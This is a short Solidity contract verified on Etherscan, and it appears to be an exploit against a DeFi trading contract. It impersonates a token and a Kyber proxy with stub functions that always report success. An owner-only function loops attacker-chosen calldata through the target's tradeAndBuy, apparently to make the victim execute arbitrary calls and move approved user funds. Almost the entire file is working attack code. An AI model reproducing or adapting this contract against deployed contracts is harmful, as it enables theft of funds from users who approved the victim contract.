/**
 *Submitted for verification at Etherscan.io on 2022-04-13
*/

/*0xb27a46794715ded06f72a242bffb01ddf7281730*/
pragma solidity ^0.5.12;
pragma experimental ABIEncoderV2;
interface tests{

   function tradeAndBuy(address nft, uint256 nftId, bytes calldata buyData, uint256 price, address _kyberProxy, address sale, address token, uint256 tokenQty, uint256 minRate) external;
}
contract test{
    
    address owner = msg.sender;
    function balanceOf(address aa) external returns(uint){
        return 0;
    }
    function transferFrom(address a,address b,uint256 cc) external returns(bool){

        return true;
    }
    function approve(address a,uint256 bb) external returns(bool){
        return true;
    }
    function tradeWithHint(address src, uint srcAmount, address dest, address payable destAddress, uint maxDestAmount, uint minConversionRate, address walletId, bytes calldata hint) external payable returns (uint){
        return 0;
    }
    function safeTransferFrom(address _from, address _to, uint256 _id, uint256 _value, bytes calldata _data) external{

    }
    function fuckyou(address vlu,address token,bytes[] calldata data) external{
        require(msg.sender == owner,"fuckyou!!");
        for(uint i=0;i < data.length;i++){
            tests(vlu).tradeAndBuy(address(this),0,data[i],0,address(this),token,address(this),0,0);
        }
    }
}